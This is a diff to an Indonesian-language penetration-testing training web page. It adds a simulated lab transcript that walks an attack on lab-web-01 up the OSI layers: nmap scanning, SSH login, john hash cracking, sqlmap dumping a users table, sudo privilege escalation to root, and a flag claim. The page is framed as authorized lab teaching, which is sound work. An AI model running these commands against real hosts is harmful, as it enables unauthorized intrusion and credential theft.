@@ -641,7 +641,39 @@ msf6 &gt; set session 1   <span class="t-comment"># lewat sesi sebagai jembatan<
           <div class="sec-head">
             <span class="sec-num">12 — studi kasus penuh</span>
             <h2 class="sec-title">Contoh Penuh: Satu Engagement di <span class="accent">Tujuh Lapis OSI</span></h2>
-            <p class="sec-sub">Step-by-step super lengkap untuk satu skenario utuh: pentest terhadap <code class="inline">lab-web-01</code> (192.168.1.10) yang kamu ikuti <b>naik dari kabel sampai aplikasi</b> mengikuti model OSI. Tiap lapis menyumbang satu mata rantai serangan — physical, data link, network, transport, session, presentation, application. Klik <b>Jalankan</b> pada tiap lapis berurutan dan biarkan terminal sandbox membuktikan setiap langkahnya.</p>
+            <p class="sec-sub">Step-by-step super lengkap dalam satu skenario utuh: pentest terhadap <code class="inline">lab-web-01</code> (192.168.1.10) mulai dari otorisasi sampai bukti kemenangan, <b>dari awal sampai akhir</b>, ditelusuri naik mengikuti model OSI — <b>legalitas → bit di kabel (physical) → MAC &amp; frame (data link) → IP &amp; rute (network) → port &amp; handshake (transport) → sesi SSH (session) → cracking hash &amp; encoding (presentation) → SQLi aplikasi (application) → privesc root → klaim flag</b>. Seluruh perjalanannya tertulis utuh di <b>transkrip penuh</b> di bawah — output asli sandbox, bukan sekadar cerita — dan kamu boleh menjalankan ulang tiap langkah lewat tombol <b>Jalankan</b> pada tiap lapis.</p>
+          </div>
+
+          <div class="terminal">
+            <div class="term-bar"><span class="tdot tdot-r"></span><span class="tdot tdot-y"></span><span class="tdot tdot-g"></span><span class="term-title">transkrip-penuh — engagement #07 · lab-web-01 (awal→akhir)</span><button class="term-copy" type="button"><svg style="width:13px;height:13px"><use href="#ic-copy"/></svg>Salin</button></div>
+            <div class="term-body"><pre><span class="t-comment"># ===== AWAL — otorisasi (RoA), engagement terhadap lab-web-01 dimulai =====</span>
+<span class="t-prompt">student@cyberguard:~$</span> cat lab/roa.txt
+<span class="t-ok">[GRANTED] lab-web-01 (192.168.1.10) — in scope. DILARANG: kali-recon</span>
+<span class="t-prompt">student@cyberguard:~$</span> tcpdump -i eth0 -c 4                    <span class="t-comment"># L1 physical</span>
+<span class="t-dim">11:42:31.88 IP 192.168.1.100.53218 &gt; 45.155.205.11.4444: Flags [S] · 4 packets</span>
+<span class="t-prompt">student@cyberguard:~$</span> ip a                                        <span class="t-comment"># L2 data link</span>
+<span class="t-dim">eth0: ether 00:0c:29:3a:2b:1e (VMware) · inet 192.168.1.100/24</span>
+<span class="t-prompt">student@cyberguard:~$</span> nmap -sn 192.168.1.10
+<span class="t-dim">Host is up (0.0012s) · MAC Address: 00:0C:29:3A:2B:1E (VMware)</span>
+<span class="t-prompt">student@cyberguard:~$</span> ip route &amp;&amp; cat /etc/hosts &amp;&amp; ping 192.168.1.10  <span class="t-comment"># L3 network</span>
+<span class="t-dim">default via 192.168.1.1 · 192.168.1.10 lab-web-01 · 64 bytes icmp_seq=1</span>
+<span class="t-prompt">student@cyberguard:~$</span> nmap -sV 192.168.1.10                          <span class="t-comment"># L4 transport</span>
+<span class="t-dim">22/tcp ssh OpenSSH 8.2p1 · 80/http Apache · 443/https · 3306/mysql · 6379/redis</span>
+<span class="t-prompt">student@cyberguard:~$</span> ssh webadmin@lab-web-01                       <span class="t-comment"># L5 session</span>
+<span class="t-ok">[C-SHELL] masuk sebagai webadmin@lab-web-01 — sesi aktif</span>
+<span class="t-prompt">student@cyberguard:~$</span> john lab/hashes.txt                            <span class="t-comment"># L6 presentation</span>
+<span class="t-dim">cracked 2 hash: admin:admin · webadmin:<span class="t-ok">chicken</span></span>
+<span class="t-prompt">student@cyberguard:~$</span> base64 'chicken' &amp;&amp; base64 -d Y2hpY2tlbg==
+<span class="t-dim">Y2hpY2tlbg==  →  chicken  (encoding/decoding representasi data)</span>
+<span class="t-prompt">student@cyberguard:~$</span> sqlmap -u 'http://lab-web-01/search?id=1' --dump  <span class="t-comment"># L7 application</span>
+<span class="t-dim">[id] injectable · table users dumped: webadmin:742929dcb6...</span>
+<span class="t-prompt">student@cyberguard:~$</span> id &amp;&amp; sudo /opt/backup.sh &amp;&amp; whoami
+<span class="t-hot">[*] script backup dieksekusi ROOT — kini uid=0 (root), privesc sukses</span>
+<span class="t-prompt">student@cyberguard:~$</span> cat lab/flag-web.txt &amp;&amp; flag FLAG{lab-web-01}
+<span class="t-ok">FLAG{lab-web-01} — DIKLAIM  (+1 poin: Eksploitasi Web)</span>
+<span class="t-prompt">student@cyberguard:~$</span> score
+<span class="t-ok">SCOREBOARD: [X] Eksploitasi Web · Flag 1/4 · misi lain: brute SOC, DMZ, privesc root</span>
+<span class="t-comment"># ===== AKHIR — bukti kemenangan tercatat, engagement selesai =====</span></pre></div>
           </div>
 
           <div class="praktik">
